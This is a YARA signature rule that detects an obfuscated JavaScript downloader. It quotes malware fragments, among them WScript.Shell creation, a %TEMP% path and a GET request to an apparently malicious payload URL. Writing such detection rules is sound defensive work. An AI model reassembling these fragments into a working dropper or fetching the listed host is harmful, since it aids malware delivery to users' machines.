rule sig_20160427_eed9f472813f9c9463f871d204e04ef5 {
  meta:
    description = "datamaliciousorder - file 20160427_eed9f472813f9c9463f871d204e04ef5.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6095338bb7c34062ef4c974f506bfa0c539cc1a378d1d4621259f23fa17c50f3"

  strings:
    $s1  = "function OihjxNnnrb() {return MtduhJgzta[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"WAcH3dx" ascii
    $s2  = "function OihjxNnnrb() {return MtduhJgzta[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"WAcH3dx" ascii
    $s3  = "function SyuwlSexza(FretbHhyqy, ZnsvmPzmqn){YfebuAxeww = YfebuAxeww * 1; return FretbHhyqy - ZnsvmPzmqn;};" fullword ascii
    $s4  = "var MtduhJgzta = function TsqfuUrofj() {return FmxamUdmpd[SpqmkSvkan](\"WScript\"+\".Shell\");}(), PbchlBcpwc = 11;" fullword ascii
    $s5  = "RqoovAqljc[WkoenNpzre](\"G\" + \"ET\", \"http://adamauto.nl/gdh46ss\", false);" fullword ascii
    $s6  = "var FmxamUdmpd = this[\"WScript\"];" fullword ascii
    $s7  = "if (RqoovAqljc[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function UrjzoIqamq(){return EevegYrtax + \"\";};" fullword ascii
    $s9  = "function WcgshSrskm() {return ((GdccgRftqc == true) && (GdccgRftqc == DivysIlvod)) ? 1 : YfebuAxeww;};" fullword ascii
    $s10 = "function AggeeFdmrf(){return SpqmkSvkan;};" fullword ascii
    $s11 = "DivysIlvod = true; " fullword ascii
    $s12 = "return SyuwlSexza(DptrpXfnwe, PlblrXbsjw);" fullword ascii
    $s13 = "function OnxnpOheit()" fullword ascii
    $s14 = "function MuqxxXxhxy(){return 23;};" fullword ascii
    $s15 = "var PfbebJitpg = new this[\"D\"+\"ate\"]();" fullword ascii
    $s16 = "KpdccGzbpi = true;" fullword ascii
    $s17 = "function AsqrhJlajm(NogtjIfgap) {var UlygzZjusc = (1, 2, 3, 4, 5, NogtjIfgap); return UlygzZjusc;};" fullword ascii
    $s18 = "var KpdccGzbpi = false;" fullword ascii
    $s19 = "var GdccgRftqc = false;" fullword ascii
    $s20 = "}while (FduhmJrxjt);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}